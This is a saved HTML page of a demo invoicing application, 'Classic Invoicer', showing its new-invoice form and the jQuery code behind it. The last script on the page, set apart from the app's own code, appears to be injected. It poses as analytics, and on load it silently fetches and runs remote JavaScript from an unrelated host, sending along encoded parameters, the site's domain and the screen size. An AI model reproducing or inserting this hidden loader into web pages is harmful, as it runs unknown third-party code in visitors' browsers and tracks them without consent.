<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Classic Invoicer</title>
    <link rel="icon" type="image/png" sizes="16x16" href="http://ci.elantsys.com/assets/img/favicon.png">
    <meta content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no' name='viewport'>
    <link href='http://fonts.googleapis.com/css?family=Ruda&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
    <!-- Bootstrap 3.3.2 -->
    <link href="http://ci.elantsys.com/assets/css/dataTables.bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Bootstrap 3.3.2 -->
    <link href="http://ci.elantsys.com/assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <!-- Font Awesome Icons -->
    <link href="http://ci.elantsys.com/assets/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
    <!-- Theme style -->
    <link href="http://ci.elantsys.com/assets/css/theme.min.css" rel="stylesheet" type="text/css" />
    <!-- AdminLTE Skins. Choose a skin from the css/skins-->
    <link href="http://ci.elantsys.com/assets/css/theme-skin.min.css" rel="stylesheet" type="text/css" />
    <link href="http://ci.elantsys.com/assets/css/pace.css" rel="stylesheet" type="text/css" />
    <link href="http://ci.elantsys.com/assets/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.min.css" rel="stylesheet" type="text/css" />
    <link href="http://ci.elantsys.com/assets/plugins/pikaday/pikaday.css" rel="stylesheet" type="text/css" />
    <link href="http://ci.elantsys.com/assets/plugins/chosen/chosen.css" rel="stylesheet" type="text/css" />
    <link href="http://ci.elantsys.com/assets/plugins/animsition/css/animsition.min.css" rel="stylesheet" type="text/css">
    <link href="http://ci.elantsys.com/assets/plugins/amaranjs//css/amaran.min.css" rel="stylesheet" type="text/css">
    <link href="http://ci.elantsys.com/assets/css/style.css" rel="stylesheet" type="text/css" />
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->
</head>
<body class="skin-blue sidebar-mini">
<div class="wrapper animsition">
<header class="main-header">
    <a href="http://ci.elantsys.com" class="logo">
        <!-- mini logo for sidebar mini 50x50 pixels -->
        <span class="logo-mini"><b>C</b>I 2</span>
        <!-- logo for regular state and mobile devices -->
        <span class="logo-lg"><img src="http://ci.elantsys.com/assets/img/logo.png" alt="logo"/></span>
    </a>
<!-- Header Navbar: style can be found in header.less -->
<nav class="navbar navbar-fixed-top navbar-default" role="navigation">
    <!-- Sidebar toggle button-->
    <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
        <span class="sr-only">Toggle navigation</span>
    </a>
<!-- Navbar Right Menu -->
<div class="navbar-custom-menu">
<ul class="nav navbar-nav">
    <li class="dropdown">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown"><img src="http://ci.elantsys.com/assets/img/flags/bniciplwftmsww1drnxdzfbl0filnr3qvovivdiirsg5q02zs8.jpg" class="language-img">Spanish <b class="caret"></b></a>
        <ul class="dropdown-menu">
                                                                            <li>
                    <a rel="alternate" href="http://ci.elantsys.com/lang/en">
                        <img src="http://ci.elantsys.com/assets/img/flags/1zkkvvsktknz2epc116hexm8cmflqsrcxg6rtecyohml1isx7q.png" class="language-img">english
                    </a>
                </li>
                    <li class="divider"></li>
                                                                                <li>
                    <a rel="alternate" href="http://ci.elantsys.com/lang/Fr">
                        <img src="http://ci.elantsys.com/assets/img/flags/placeholder_Flag.jpg" class="language-img">Francais
                    </a>
                </li>
                    <li class="divider"></li>
                                                                                                            <li>
                    <a rel="alternate" href="http://ci.elantsys.com/lang/NL">
                        <img src="http://ci.elantsys.com/assets/img/flags/placeholder_Flag.jpg" class="language-img">Netherlands
                    </a>
                </li>
                    <li class="divider"></li>
                                                                                <li>
                    <a rel="alternate" href="http://ci.elantsys.com/lang/cs">
                        <img src="http://ci.elantsys.com/assets/img/flags/placeholder_Flag.jpg" class="language-img">Czech
                    </a>
                </li>
                    <li class="divider"></li>
                                                                                <li>
                    <a rel="alternate" href="http://ci.elantsys.com/lang/GR">
                        <img src="http://ci.elantsys.com/assets/img/flags/placeholder_Flag.jpg" class="language-img">Greece
                    </a>
                </li>
                    <li class="divider"></li>
                                    </ul>
    </li>
<!-- User Account: style can be found in dropdown.less -->
<li class="dropdown user user-menu">
    <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                <img src="http://ci.elantsys.com/assets/img/uploads/hcphspuduiqyzniul5w2yygbjmynmwt4qqsmwzqh4myg7ycab2.jpg" class="user-image" alt="User Image"/>
        <span class="hidden-xs"> John Doe </span>
                <b class="caret"></b>
    </a>
    <ul class="dropdown-menu">
        <!-- User image -->
        <li class="user-header">
                        <img src="http://ci.elantsys.com/assets/img/uploads/hcphspuduiqyzniul5w2yygbjmynmwt4qqsmwzqh4myg7ycab2.jpg" class="img-circle" alt="User Image" />
            <p>John Doe </p>
                    </li>
        <!-- Menu Footer-->
        <li class="user-footer">
            <div class="pull-left">
                <a href="http://ci.elantsys.com/profile" class="btn btn-primary btn-sm btn-flat">Edit Profile</a>
            </div>
            <div class="pull-right">
                <a href="http://ci.elantsys.com/logout" class="btn btn-danger btn-sm btn-flat">Logout</a>
            </div>
        </li>
    </ul>
</li>
</ul>
</div>
</nav>
</header>
<!-- Left side column. contains the logo and sidebar -->
<aside class="main-sidebar">
    <!-- sidebar: style can be found in sidebar.less -->
    <section class="sidebar">
        <!-- Sidebar user panel -->
        <div class="user-panel">
                        <div class="pull-left image">
                <img src="http://ci.elantsys.com/assets/img/uploads/hcphspuduiqyzniul5w2yygbjmynmwt4qqsmwzqh4myg7ycab2.jpg" class="img-circle" alt="User Image" />
            </div>
            <div class="pull-left info">
                <p> John Doe </p>
                <a href="#"><i class="fa fa-circle text-success"></i> Online</a>
            </div>
                    </div>
        <!-- sidebar menu: : style can be found in sidebar.less -->
        <ul class="sidebar-menu">
            <li class="header">Main Menu</li>
            <li class=""><a href="http://ci.elantsys.com"><i class="fa fa-home"></i><span>Dashboard</span></a></li>
            <li class=""><a href="http://ci.elantsys.com/clients"><i class="fa fa-users"></i><span>Clients</span></a></li>
            <li class="active"><a href="http://ci.elantsys.com/invoices"><i class="fa fa-file-pdf-o"></i><span>Invoices</span></a></li>
            <li class=""><a href="http://ci.elantsys.com/estimates"><i class="fa fa-list-alt"></i><span>Estimates</span> </a></li>
            <li class=""><a href="http://ci.elantsys.com/payments"><i class="fa fa-money"></i><span>Payments</span></a></li>
            <li class=" "><a href="http://ci.elantsys.com/expenses"><i class="fa fa-credit-card "></i><span>Expenses</span></a></li>
            <li class=" "><a href="http://ci.elantsys.com/products"><i class="fa fa-puzzle-piece"></i> <span>Products</span></a></li>
            <li class=""><a href="http://ci.elantsys.com/reports"><i class="fa fa-line-chart"></i> <span>Reports</span></a></li>
            <li class=""><a href="http://ci.elantsys.com/users"><i class="fa fa-user "></i> <span>Users</span></a></li>
                        <li class=""><a href="http://ci.elantsys.com/settings/company"><i class="fa fa-cogs"></i> <span>Settings</span></a></li>
                        <li class="header">Account Menu</li>
            <li class=""><a href="http://ci.elantsys.com/profile"><i class="fa fa-user-md "></i> <span>Profile</span></a></li>
            <li class=""><a href="http://ci.elantsys.com/logout"><i class="fa fa-power-off"></i> <span>Logout</span></a></li>
        </ul>
    </section>
    <!-- /.sidebar -->
</aside><!-- Content Wrapper. Contains page content -->
<div class="content-wrapper">
<!-- Content Header (Page header) -->
<div class="col-md-12 content-header" >
    <h1><i class="fa fa-file-pdf-o"></i> Invoices</h1>
</div>
<section class="content">
<div class="row">
<div class="col-md-12">
<div class="panel panel-default">
    <div class="row">
        <div class="col-md-6" style="width:1000px;margin-left:20px"><br/>
            <a href="http://ci.elantsys.com/invoices" class="btn btn-info btn-xs"> <i class="fa fa-chevron-left"></i> Back</a>
        </div>
    </div>
<div class="panel-body">
<div class="row">
    <div class="invoice">
        <form method="POST" action="http://ci.elantsys.com/invoices" accept-charset="UTF-8" id="invoice_form" data-toggle="validator" role="form"><input name="_token" type="hidden" value="YARWelMxvPpu2OW9UfV4wpcadnaZsKcVCNAz5V7q">
        <div class="col-md-12">
          <div class="text-right"><h1 style="margin:0">Invoices</h1></div>
            <div class="col-md-7" style="padding: 0px">
                <div class="contact to">
                    <div class="form-group">
                        <label for="client">Client</label>
                        <div class="input-group col-md-9">
                            <select class="form-control chosen input-sm" id="client" required="required" name="client"><option value="1ed58ab5-774c-4b1e-924f-325012e84e3b">Jane Doe</option><option value="7e64e772-a9a6-445f-9f7b-765a93afe9fd">Nader</option><option value="f3b87335-f8b4-474a-a5df-b9ab2bbdaca4">111</option><option value="6fdca979-89a4-4e88-a725-340f1422c466">Leo</option><option value="e2032b87-865e-4767-a101-02805527532b">Forhad</option><option value="0b7396b5-cf31-4428-b363-355cb5e0cd50">Sam</option><option value="d1ce5a8f-40e9-499b-ad76-175d8f4eb211">Kassio ricardo pinheiro</option><option value="5e8c15f5-18b8-4d4a-906a-c035025ab38a">pepepe</option><option value="752f5235-18e1-4d24-b8ec-bf7c6ca841c4">Augusto</option><option value="0022eedb-5ec1-4e84-849e-19ed0f90d079">mum</option><option value="e8b3d21e-acfc-4ff7-8814-37b4e053f0eb">rocks</option><option value="075fe885-e333-4141-bc85-d3111ed1d751">anamul</option><option value="1654d93a-7889-45f6-80e3-feee5527e515">Mathias Ko</option><option value="720c76a5-6aac-4bd9-8fd9-1c442fef6a9a">Paul Kimani</option><option value="7efc29a4-f4ad-40f7-b142-c571a3c8b805">GEORGE waithaka</option><option value="48e608c7-e456-47f4-94c5-c06e8644564d">moynul</option><option value="af4dc71c-5f97-4c55-b075-166c738e393a">CASH</option><option value="bbbca4fc-209c-4ca9-82ff-f9024e2fb5a7">jesus</option><option value="eaa33def-7c8c-442c-a5ad-5592569025b4">ZXC&lt;Z&lt;</option><option value="e12322a3-ba91-4d31-8312-eaf2b88fc6b4">Pedro Perez</option><option value="42cd3fb8-777e-4962-a654-288017ff12ef">hassane</option><option value="3b1287a5-eb2f-4275-8c7e-29c2dc8d3aac">Maxi Mustermann</option><option value="1b88aefe-e0e7-433f-9518-83197d5fbd3f">Digital Tech </option><option value="f2c5c577-559c-4b70-b3fa-1bf3ff48796d">ពិភពសាច់អាំង១៦៨</option><option value="79862866-b0de-4d0f-8fa9-a4914a0e3369">test1</option><option value="0ee9c39e-7027-4797-bba4-5719323b07b6">Frank Bruno</option></select>
                            <span class="input-group-addon">
                                <a href="http://ci.elantsys.com/clients/create" data-toggle="ajax-modal" class="ajaxNonReload" data-element="client"><i class="fa fa-plus"></i></a>
                            </span>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="currency">Currency</label>
                        <div class="input-group col-md-9">
                            <select class="form-control input-sm chosen" required="required" id="currency" name="currency"><option value="AFN(؋)">Afghanistan, Afghani</option><option value="AOA(Kz)">Angola, Kwanza</option><option value="LBP(ل.ل.‏)">Lebanese Pound</option><option value="SAR(﷼)">Saudi Riyal</option><option value="TZS(TSh)">Tanzanian Shilling</option><option value="NGN(₦)">Nigeria, Naira</option><option value="CZK(Kč)">Czech Koruna</option><option value="EUR(€)">Euro</option><option value="USD($)">US Dollar</option><option value="AZN(₼)">Azerbaijanian Manat</option><option value="GBP(£)">Pound Sterling</option><option value="BIF(FBu)">Burundi Franc</option><option value="PLN(zł)">Poland, Zloty</option><option value="ARS($)">Argentine Peso</option><option value="MZN(MT)">Mozambique Metical</option><option value="KES(S)">Kenyan Shilling</option><option value="ALL(Lek)">Albania, Lek</option><option value="LKR(₨)">Sri Lanka Rupee</option><option value="GIP(£)">Gibraltar Pound</option><option value="GHS(₵)">Ghana Cedi</option><option value="INR(₹)">Indian Rupee</option></select>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="number">Invoice Number</label>
                        <div class="input-group col-md-9">
                            <input class="form-control input-sm" id="number" required="required" readonly="readonly" name="number" type="text" value="INV-135">
                            <span class="input-group-addon" style="padding-top: 6px;padding-bottom: 6px;">
                                <a id="change_invoice_num" href="javascript:void(0)"><i class="fa fa-pencil"></i></a>
                            </span>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="number">Recurring</label>
                        <div class="input-group col-md-9">
                            <select class="form-control input-sm chosen" required="required" name="recurring"><option value="0" selected="selected">No</option><option value="1">Yes</option></select>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-md-5" style="padding: 0px">
                <div class="form-group">
                    <label for="invoice_date">Date</label>
                    <input class="form-control datepicker input-sm" id="invoice_date" required="required" readonly="readonly" name="invoice_date" type="text" value="2018-05-17">
                </div>
                <div class="form-group">
                    <label for="due_date">Due Date</label>
                    <input class="form-control datepicker input-sm" id="due_date" readonly="readonly" name="due_date" type="text" value="2018-05-24">
                </div>
                <div class="form-group">
                    <label for="status">Status</label>
                    <select class="form-control chosen required input-sm" name="status" id="status">
                                                    <option value="0"> UNPAID </option>
                                                    <option value="1"> PARTIALLY PAID </option>
                                                    <option value="2"> PAID </option>
                                                    <option value="3"> OVERDUE </option>
                                            </select>
                </div>
                <div class="form-group">
                    <label for="number">Recurring Cycle</label>
                    <select class="form-control input-sm chosen" required="required" name="recurring_cycle"><option value="1" selected="selected">Monthly</option><option value="2">Quarterly</option><option value="3">Semi Annually</option><option value="4">Annually</option></select>
                </div>
            </div>
    </div>
    <div class="col-md-12">
        <table class="table table-striped" id="item_table">
            <thead class="item-table-header">
            <tr>
                <th width="5%"></th>
                <th width="20%">Product</th>
                <th width="35%">Description</th>
                <th width="10%" class="text-center">Quantity</th>
                <th width="10%" class="text-center">Price</th>
                <th width="10%" class="text-center">Tax</th>
                <th width="10%"class="text-right">Amount</th>
            </tr>
            </thead>
            <tbody>
                <tr class="item">
                    <td></td>
                    <td><div class="form-group"><input class="form-control input-sm item_name" id="item_name" required="required" name="item_name" type="text"></div></td>
                    <td><div class="form-group"><textarea class="form-control item_description input-sm" id="item_description" rows="1" style="resize: vertical;text-transform: capitalize;" name="item_description" cols="50"></textarea></div></td>
                    <td><div class="form-group"><input class="form-control calcEvent quantity input-sm" id="quantity" required="required" step="any" min="0" name="quantity" type="number"></div></td>
                    <td><div class="form-group"><input class="form-control calcEvent price input-sm" id="price" required="required" step="any" min="0" name="price" type="number"></div></td>
                    <td><div class="form-group"><select class="form-control calcEvent tax input-sm" id="tax" name="tax"><option value="" data-value="">None</option><option value="c356bc0a-bbaf-401a-9d76-5123d5a19859" selected="selected" data-value="12">IVA</option></select></div></td>
                    <td class="text-right"><span class="itemTotal">0.00</span></td>
                </tr>
            </tbody>
        </table>
    </div><!-- /.col -->
    <div class="col-md-6">
        <span id="btn_add_row" class="btn btn-xs btn-info "><i class="fa fa-plus"></i> Add Row</span>
        <span id="btn_product_list_modal" class="btn btn-xs btn-primary "><i class="fa fa-plus"></i> Add From Products</span>
    </div><!-- /.col -->
    <div class="col-md-6">
        <table class="table">
            <tbody>
            <tr>
                <th style="width:50%">Sub Total</th>
                <td class="text-right">
                    <span id="subTotal">0.00</span>
                </td>
            </tr>
            <tr>
                <th>Tax</th>
                <td class="text-right">
                    <span id="taxTotal">0.00</span>
                </td>
            </tr>
            <tr>
                <th style="vertical-align: middle">
                    Discount
                    <select class="text-right input-sm calcEvent" id="discount_mode" style="width:50%" name="discount_mode"><option value="1">%</option><option value="0">Amount</option></select>
                </th>
                <td class="text-right">
                    <div class="form-group">
                    <input class="form-control text-right calcEvent input-sm" id="discount" step="any" min="0" name="discount" type="number">
                   </div>
                </td>
            </tr>
            <tr class="amount_due">
                <th>Total:</th>
                <td class="text-right">
                    <span class="currencySymbol" style="display: inline-block;"></span>
                    <span id="grandTotal">0.00</span>
                </td>
            </tr>
            </tbody>
        </table>
    </div>
    <div class="col-md-12">
        <div class="form-group">
            <label for="notes">Notes</label>
            <textarea class="form-control text_editor" rows="2" name="notes" cols="50" id="notes"></textarea>
        </div>
        <div class="form-group">
            <label for="terms">Terms</label>
            <textarea class="form-control text_editor" id="invoice_terms" rows="2" name="terms" cols="50">&lt;div&gt;NAME: CLASSIC INVOICER CONSULTING TAX CODE HOLDER: AAGB860519G31&lt;br&gt;&lt;/div&gt;</textarea>
        </div>
    </div>
    <div class="col-md-12">
        <button type="submit" class="btn btn-xs btn-success pull-right" id="saveInvoice"><i class="fa fa-save"></i> Save Invoice</button>
    </div>
    </form>
    </div>
    </div>
   </div>
  </div>
 </div>
</div>
</section>
</div><!-- /.content-wrapper -->
    <div id="ajax-modal" class="modal fade" tabindex="-1" role="dialog" data-backdrop="static"></div>
    </div><!-- ./wrapper -->
<!-- jQuery 2.1.3 -->
<script src="http://ci.elantsys.com/assets/js/jquery-2.1.3.min.js"></script>
<!-- Bootstrap 3.3.2 JS -->
<script src="http://ci.elantsys.com/assets/js/bootstrap.min.js" type="text/javascript"></script>
<!-- Bootstrap Dialog -->
<script src="http://ci.elantsys.com/assets/js/bootstrap-dialog.js"></script>
<!-- Jquery Datatables -->
<script src="http://ci.elantsys.com/assets/js/jquery.dataTables.js"></script>
<!-- Datatables -->
<script src="http://ci.elantsys.com/assets/js/datatables.js"></script>
<!-- Pace.js -->
<script src="http://ci.elantsys.com/assets/js/pace.min.js"></script>
<!-- summernote.js javascript -->
<script src="http://ci.elantsys.com/assets/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js"></script>
<!-- datepicker.js javascript-->
<script src="http://ci.elantsys.com/assets/plugins/pikaday/moment.js"></script>
<script src="http://ci.elantsys.com/assets/plugins/pikaday/pikaday.js"></script>
<script src="http://ci.elantsys.com/assets/plugins/pikaday/pikaday.jquery.js"></script>
<!-- chosen.js javascript-->
<script src="http://ci.elantsys.com/assets/plugins/chosen/chosen.jquery.js"></script>
<script src="http://ci.elantsys.com/assets/plugins/animsition/js/jquery.animsition.min.js" type="text/javascript"></script>
<!-- validator.js javascript-->
<script src="http://ci.elantsys.com/assets/js/validator.min.js"></script>
<!-- toastr.js javascript-->
<script src="http://ci.elantsys.com/assets/plugins/amaranjs/js/jquery.amaran.min.js"></script>
<!-- custom.js -->
<script src="http://ci.elantsys.com/assets/js/app.js"></script>
<script src="http://ci.elantsys.com/assets/js/custom.js"></script>

<script type="text/javascript">
$(function(){
    $('tr.item select').chosen({width:'100%'});

    $('.text_editor').wysihtml5({image:false,link:false});

    $( document ).on("click change paste keyup", ".calcEvent", function() {
        calcTotals();
    });

    $(document).on('click', '.delete_row', function(){
        $(this).parents('tr').remove();
        calcTotals();
    });

    $( document ).on('click', '.deleteItem', function() {
        var $this = $(this);
        BootstrapDialog.show({
            title: 'Deleting a Record',
            message: 'Are you sure you want to delete this record. This action cannot be undone.',
            buttons: [ {
                icon: 'fa fa-check',
                label: ' Yes',
                cssClass: 'btn-success btn-xs',
                action: function(dialogItself){
                    $.post("http://ci.elantsys.com/invoices/deleteItem", { "_token": "YARWelMxvPpu2OW9UfV4wpcadnaZsKcVCNAz5V7q", id : $this.attr('data-id') } , 'json').done(function(data){
                        $this.parents('tr').remove();
                        calcTotals();
                    }).fail(function(jqXhr, json, errorThrown){
                    }).always(function(){
                        dialogItself.close();
                    });
                }
            }, {
                icon: 'fa fa-remove',
                label: 'No',
                cssClass: 'btn-danger btn-xs',
                action: function(dialogItself){
                    dialogItself.close();
                }
            }]
        });
    });

    $('#btn_product_list_modal').click(function() {
        $('.invoice').addClass('spinner');
        var $modal = $('#ajax-modal');
        $.get('http://ci.elantsys.com/products_modal', function(data) {
            $modal.modal();
            $modal.html(data);
            $('.invoice').removeClass('spinner');
            var t = $('.datatable').DataTable({
                "columnDefs": [ {
                    "searchable": false,
                    "orderable": false,
                    "targets": 0
                } ],
                "order": [[ 1, 'asc' ]],
                "bLengthChange": false,
                "bInfo" : false,
                "filter" : true,
                'paging': true,
                "oLanguage": { "sSearch": ""}
            });
            $('div.dataTables_filter input').addClass('form-control input-sm');
            $('[data-toggle="popover"]').popover();
        });
    });

    $('#invoice_form').validator().on('submit', function (e) {
        if (!e.isDefaultPrevented()) {
            $('.invoice').addClass('spinner');
            $('.invoice .alert-danger').remove();
            var $form = $('#invoice_form');
            var data = $('#invoice_form select, input, textarea').not('#item_name,#item_description, #tax, #quantity, #price, #itemId').serializeArray();
            var items = [];
            var item_order = 1;
            $('table tr.item').each(function() {
                var row = {};
                $(this).find('input,select,textarea').each(function()
                {
                    if($(this).attr('name')) row[$(this).attr('name')] = $(this).val();
                });
                items.push(row);
            });
            data.push({name : 'items', value: JSON.stringify(items)});
            $.post($form.attr('action'), data , 'json').done(function(data){
                if(data.errors)
                {
                    return;
                }
                if(data.redirectTo){
                    window.location = data.redirectTo;
                }else {
                    window.location.reload();
                }
                // Refresh page, or redirect if url has been passed
            }).fail(function(jqXhr, json, errorThrown){
                var errors = jqXhr.responseJSON;
                var errorStr = '';
                $.each( errors, function( key, value ) {
                    $('#'+key).parents('.form-group').addClass('has-error');
                    $('.'+key).parents('.form-group').addClass('has-error');
                    errorStr += '- ' + value[0] + '<br/>';
                });
                var errorsHtml= '<div class="alert alert-danger"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>' + errorStr + '</div>';
                $('.invoice').prepend(errorsHtml);
            }).always(function(){
                $('.invoice').removeClass('spinner');
            });
            return false;
        }
    });

    /* ----------------------------------------------------------------------------------------------------
    ADDING SELECTED PRODUCTS TO THE INVOICE
    --------------------------------------------------------------------------------------------------------*/
    $(document).on('click', '#select-products-confirm', function()
    {
        var products_lookup_ids = [];
        $("input[name='products_lookup_ids[]']:checked").each(function ()
        {
            products_lookup_ids.push($(this).val());
        });
        $.post("http://ci.elantsys.com/process_products_selections", {
            products_lookup_ids : products_lookup_ids,_token:'YARWelMxvPpu2OW9UfV4wpcadnaZsKcVCNAz5V7q'
        }).done(function(data){
            var products = data.products;
            for(var key in products) {
                //noinspection JSJQueryEfficiency
                var last_row = $('#item_table tr:last');
                if (last_row.find('input[name=item_name]').val() !== '')
                {
                    cloneRow('item_table');
                    var last_row = $('#item_table tr:last');
                    last_row.find('input[name=item_name]').val(products[key].name);
                    last_row.find('textarea[name=item_description]').val(products[key].description);
                    last_row.find('input[name=price]').val(products[key].price);
                    last_row.find('input[name=quantity]').val('1');
                }
                else
                {
                    last_row.find('input[name=item_name]').val(products[key].name);
                    last_row.find('textarea[name=item_description]').val(products[key].description);
                    last_row.find('input[name=price]').val(products[key].price);
                    last_row.find('input[name=quantity]').val('1');
                }
                $('#modal-choose-products').modal('hide');
                calcTotals();
            }
        }).always(function(){
            $('#ajax-modal').modal('toggle');
        });
    });

    $(document).on('click', '#change_invoice_num', function(){
        $("#number").prop("readonly", false);
    });
});

function calcTotals(){
        var subTotal    = 0;
        var total       = 0;
        var amountDue   = 0;
        var totalTax    = 0;
        $('tr.item').each(function(){
            var quantity    = parseFloat($(this).find("[name='quantity']").val());
            var price        = parseFloat($(this).find("[name='price']").val());
            var itemTax     = $(this).find("[name='tax']").val();
            var itemTotal   = parseFloat(quantity * price) > 0 ? parseFloat(quantity * price) : 0;
            var taxValue    = $(this).find("[name='tax'] option[value='" + itemTax + "']").attr('data-value');
            subTotal        += parseFloat(price * quantity) > 0 ? parseFloat(price * quantity) : 0;
            totalTax        += parseFloat(price * quantity * taxValue/100) > 0 ? parseFloat(price * quantity * taxValue/100) : 0;
            $(this).find(".itemTotal").text( itemTotal.toFixed(2) );
        });
        var discount_mode = parseInt($("[name='discount_mode']").val());
        var discount    = parseFloat($("[name='discount']").val()) > 0 ? parseFloat($("[name='discount']").val()) : 0;
        var paid        = parseFloat($("#paidAmount").val()) > 0 ? parseFloat($("#paidAmount").val()) : 0;
        var discount_amount = discount_mode == 1 ? subTotal * (discount/100) : discount;
        total           += parseFloat(subTotal+totalTax-discount_amount);
        amountDue       += parseFloat(subTotal+totalTax-discount_amount-paid);
        $( '#subTotal' ).text( subTotal.toFixed(2) );
        $( '#taxTotal' ).text( totalTax.toFixed(2) );
        $( '#grandTotal' ).text( total.toFixed(2) );
        $( '#amountDue' ).text( amountDue.toFixed(2) );
}

var count = "1";
function cloneRow(in_tbl_name)
{
        var tbody = document.getElementById(in_tbl_name).getElementsByTagName("tbody")[0];
        // create row
        var row = document.createElement("tr");
        // create table cell 1
        var td1 = document.createElement("td");
        var strHtml1 = "<span class='btn btn-danger btn-xs delete_row'><i class='fa fa-minus'></i></span> ";
        td1.innerHTML = strHtml1.replace(/!count!/g,count);
        // create table cell 2
        var td2 = document.createElement("td");
        var strHtml2 = '<div class="form-group"><input class="form-control input-sm item_name" id="item_name" required="required" name="item_name" type="text"></div>';
        td2.innerHTML = strHtml2.replace(/!count!/g,count);
        // create table cell 3
        var td3 = document.createElement("td");
        var strHtml3 = '<div class="form-group"><textarea class="form-control item_description input-sm" id="item_description" rows="1" style="resize: vertical;text-transform: capitalize;" name="item_description" cols="50"></textarea></div>';
        td3.innerHTML = strHtml3.replace(/!count!/g,count);
        // create table cell 4
        var td4 = document.createElement("td");
        var strHtml4 = '<div class="form-group"><input class="form-control input-sm calcEvent quantity" id="quantity" required="required" step="any" min="0" name="quantity" type="number"></div> ';
        td4.innerHTML = strHtml4.replace(/!count!/g,count);
        // create table cell 5
        var td5 = document.createElement("td");
        var strHtml5 = '<div class="form-group"><input class="form-control input-sm calcEvent price" id="price" required="required" step="any" min="0" name="price" type="number"></div> ';
        td5.innerHTML = strHtml5.replace(/!count!/g,count);
        // create table cell 6
        var td6 = document.createElement("td");
        var strHtml6 = '<div class="form-group"><select class="form-control input-sm calcEvent tax" id="tax" name="tax"><option value="" data-value="">None</option><option value="c356bc0a-bbaf-401a-9d76-5123d5a19859" selected="selected" data-value="12">IVA</option></select></div> ';
        td6.innerHTML = strHtml6.replace(/!count!/g,count);
        // create table cell 7
        var td7 = document.createElement("td");
        var strHtml7 = '<span class="itemTotal">0.00</span> ';
        td7.innerHTML = strHtml7.replace(/!count!/g,count);
        td7.className = 'text-right';
        // append data to row
        row.appendChild(td1);
        row.appendChild(td2);
        row.appendChild(td3);
        row.appendChild(td4);
        row.appendChild(td5);
        row.appendChild(td6);
        row.appendChild(td7);
        // add to count variable
        count = parseInt(count) + 1;
        // append row to table
        tbody.appendChild(row);
        row.className = 'item';
        $('tr.item:last select').chosen({width:'100%'});
}
</script>

<script type="text/javascript">
    $(function(){
        /*-----------------------------------------------------------
         Delete Button clicked
         --------------------------------------------------------------*/
        $(document).on('click', '.btn-delete', function (e){e.preventDefault(); confirm_dialog($(this).parent('form')); });
        function confirm_dialog(form){
            BootstrapDialog.show({
                title: 'Deleting a Record',
                message: 'Are you sure you want to delete this record. This action cannot be undone.',
                buttons: [ {
                    icon: 'fa fa-check',
                    label: 'Yes',
                    cssClass: 'btn-success btn-xs pull-left',
                    action: function(){
                        form.submit();
                    }
                }, {
                    icon: 'fa fa-remove',
                    label: 'No',
                    cssClass: 'btn-danger btn-xs pull-right',
                    action: function(dialogItself){
                        dialogItself.close();
                    }
                }]
            });
            return false;
        }
    });
</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mp570evIFxA2omPSns9WTo5%2fnRlp2M7IjZOdcINsHclc7IA6VHWyThAqHbK0LWPlfWk8n5l%2bDpRGd6D8x%2b2opIfYWc477k3rr3yoB4%2fxoPVZ9%2fLB%2fYGABtIjOwGbUrXjl4F20lobUKLzUKcLspyR6D4vS6J63SbzWKiSYf64xZTR0c%2bqvJKWOytfTEhfKcusjwKpOmkX7U4xjsJBqIZuu%2bZ%2fHRe27AWs2wDExZRQ%2b7XjgZNDW4Ub9mNKweMG4tW41d%2fQ1JNPYed%2b0ns3A87Ej653L7Eu1a86prS%2fuP43u9H%2fucirE5CIcuMqWnO1wo2f3uUNVWFybnNBx13UdMEzUFaxylKPejuV2pFZ9%2b4ieGZ3e6HPDJVyQbyXTAVDf8lAS%2bmF81%2f6at%2fZJWP0AHi7oKb3KBoM2D%2fYf" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>